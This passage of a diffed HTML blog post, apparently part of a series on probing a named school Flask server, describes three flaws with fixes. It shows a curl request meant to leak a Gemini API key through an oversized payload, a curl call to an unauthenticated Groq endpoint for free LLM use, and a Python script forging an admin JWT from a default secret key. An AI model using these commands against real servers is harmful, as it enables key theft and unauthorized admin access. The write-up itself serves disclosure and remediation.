+<p>We can force an error to leak the API key by sending a huge payload:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">python3 -c </span><span>&quot;</span><span style="color:#a3be8c;">import json; print(json.dumps({&#39;text&#39;: &#39;x&#39; * 1000000}))</span><span>&quot; | \
+</span><span style="color:#bf616a;">curl -X</span><span> POST https://flask.opencodingsociety.com/api/gemini \
+</span><span style="color:#bf616a;">  -H </span><span>&quot;</span><span style="color:#a3be8c;">Content-Type: application/json</span><span>&quot; \
+</span><span style="color:#bf616a;">  -b</span><span> cookie.txt \
+</span><span style="color:#bf616a;">  -d</span><span> @-
+</span></code></pre>
+<p>I'm not sure if this works yet, because at the time of writing this, I kept on hitting a rater limiter (error <code>429</code>) with Gemini. Theoretically, it should work though.</p>
+<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>{&quot;</span><span style="color:#a3be8c;">message</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Rate limit exceeded. Please try again later.</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">error_code</span><span>&quot;: </span><span style="color:#d08770;">429</span><span>}
+</span></code></pre>
+<h3 id="solution">Solution<a class="post-anchor" href="#solution" aria-label="Anchor link for: solution"><span aria-hidden="true">#</span></a>
+</h3>
+<p>Instead of returning the endpoint, we can instead log it without returning the endpoint:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#65737e;"># api/gemini_api.py
+</span><span>current_app.logger.</span><span style="color:#bf616a;">error</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">Gemini API error: </span><span>{endpoint}&quot;)
+</span><span style="color:#b48ead;">return </span><span>{
+</span><span>    &#39;</span><span style="color:#a3be8c;">message</span><span>&#39;: &#39;</span><span style="color:#a3be8c;">Gemini API error</span><span>&#39;,
+</span><span>    &#39;</span><span style="color:#a3be8c;">error_code</span><span>&#39;: response.status_code
+</span><span>}, </span><span style="color:#d08770;">500
+</span></code></pre>
+<hr />
+<h2 id="free-llm-credits">Free LLM Credits!<a class="post-anchor" href="#free-llm-credits" aria-label="Anchor link for: free-llm-credits"><span aria-hidden="true">#</span></a>
+</h2>
+<p>With the Groq API, no authentication is required, so anybody can use the Flask server's stored API key with Groq:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#65737e;"># api/groq_api.py
+</span><span style="color:#b48ead;">class </span><span style="color:#ebcb8b;">_Generate</span><span style="color:#eff1f5;">(</span><span style="color:#a3be8c;">resource</span><span style="color:#eff1f5;">):
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">post</span><span>(</span><span style="color:#bf616a;">self</span><span>): </span><span style="color:#65737e;"># has no @token_required()
+</span></code></pre>
+<p>But alas, the server is safe again (like the path traversal) from no implementation yet!</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">curl -X</span><span> POST https://flask.opencodingsociety.com/api/groq \
+</span><span>&gt; -H &quot;</span><span style="color:#a3be8c;">Content-Type: application/json</span><span>&quot; \
+</span><span>&gt; -d &#39;</span><span style="color:#a3be8c;">{ &quot;messages&quot;: [{&quot;role&quot;: &quot;users&quot;, &quot;content&quot;: &quot;Generate 200 words about rust&quot;}]}</span><span>&#39;
+</span></code></pre>
+<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>{&quot;</span><span style="color:#a3be8c;">message</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">API key not configured</span><span>&quot;}
+</span></code></pre>
+<h3 id="solution-1">Solution<a class="post-anchor" href="#solution-1" aria-label="Anchor link for: solution-1"><span aria-hidden="true">#</span></a>
+</h3>
+<p>The fix is simple here: just add a <code>token_required()</code> trait:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">class </span><span style="color:#ebcb8b;">_Generate</span><span style="color:#eff1f5;">(</span><span style="color:#a3be8c;">Resource</span><span style="color:#eff1f5;">):
+</span><span>    @</span><span style="color:#bf616a;">token_required</span><span>()  </span><span style="color:#65737e;"># add this
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">post</span><span>(</span><span style="color:#bf616a;">self</span><span>):
+</span></code></pre>
+<hr />
+<h2 id="secret-keys">Secret Keys<a class="post-anchor" href="#secret-keys" aria-label="Anchor link for: secret-keys"><span aria-hidden="true">#</span></a>
+</h2>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#65737e;"># __init__.py
+</span><span style="color:#bf616a;">SECRET_KEY </span><span>= os.environ.</span><span style="color:#bf616a;">get</span><span>(&#39;</span><span style="color:#a3be8c;">SECRET_KEY</span><span>&#39;) or &#39;</span><span style="color:#a3be8c;">SECRET_KEY</span><span>&#39; </span><span style="color:#65737e;"># secret key for session management
+</span></code></pre>
+<p>If <code>SECRET_KEY</code> isn't set (as an env var), then it defaults to the literal string. From my previous RCE attack, I demonstrated I could overwrite files. Thus, if I wanted to, I could overwrite the <code>.env</code> file with this forge my own token to put in a backdoor:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">import </span><span>jwt
+</span><span>
+</span><span>secret = &quot;</span><span style="color:#a3be8c;">SECRET_KEY</span><span>&quot;
+</span><span>
+</span><span style="color:#65737e;"># forge token
+</span><span>token = jwt.</span><span style="color:#bf616a;">encode</span><span>(
+</span><span>    {&quot;</span><span style="color:#a3be8c;">_uid</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">admin</span><span>&quot;},
+</span><span>    secret,
+</span><span>    algorithm:&quot;</span><span style="color:#a3be8c;">HS256</span><span>&quot;
+</span><span>)
+</span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">Token: </span><span>{token}&quot;)
+</span></code></pre>
+
+        </article>
+        <nav class="post-navigation">
+            <header class="post-navigation-title">
+                <h2>Read More Posts</h2>
+                <hr>
+            </header>
+            <div class="post-navigation-buttons">
+                <a rel="next" href="https://mataiodoxion.github.io/blog/smashing-morts-server-3/" aria-label="Next article">
+                    <span aria-hidden="true">&lt;&nbsp;[</span>Smashing Mort&#x27;s Server for Fun and No Profit 3<span aria-hidden="true">]</span>
+                </a>
+                <span aria-hidden="true" role="separator">::</span>
+                <a rel="prev" href="https://mataiodoxion.github.io/blog/smashing-morts-server-1/" aria-label="Prev article">
+                    <span aria-hidden="true">[</span>Smashing Mort&#x27;s Server for Fun and No Profit 1<span aria-hidden="true">]&nbsp;&gt;</span>
+                </a>
+            </div>
+        </nav>
+    </main>
+    <footer class="footer">
+        <p class="copyright">
+            <span>© <time>2026</time></span>
+            <span>Powered by <a href="https://www.getzola.org">Zola</a></span>
+            <span>Theme by <a href="https://eyalkalderon.com">ebkalderon</a></span>
+        </p>
+    </footer>
+</body>
+
+</html>
